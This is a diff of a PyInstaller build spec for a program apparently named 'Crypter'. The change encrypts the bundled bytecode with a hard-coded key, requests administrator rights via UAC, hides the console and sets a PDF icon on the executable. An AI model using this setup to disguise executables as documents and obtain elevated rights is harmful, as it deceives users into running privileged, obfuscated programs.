@@ -1,12 +1,14 @@
 # -*- mode: python -*-
 
-block_cipher = None
+block_cipher = pyi_crypto.PyiBlockCipher(key='0123456789ABCDEF')
 
 
 a = Analysis(['..\\Crypter\\Main.py'],
-             pathex=['C:\\development\\Crypter\\build'],
-             binaries=None,
-             datas=None,
+             pathex=['.\\build'],
+             binaries=[],
+             datas=[("Resources/crypter_logo_small.bmp", "."),
+	       ("Resources/crypter_title.bmp", ".")
+	     ],
              hiddenimports=[],
              hookspath=[],
              runtime_hooks=[],
@@ -25,4 +27,4 @@ exe = EXE(pyz,
           debug=False,
           strip=False,
           upx=True,
-          console=False )
+          console=False , uac_admin=True, icon='pdf.ico')
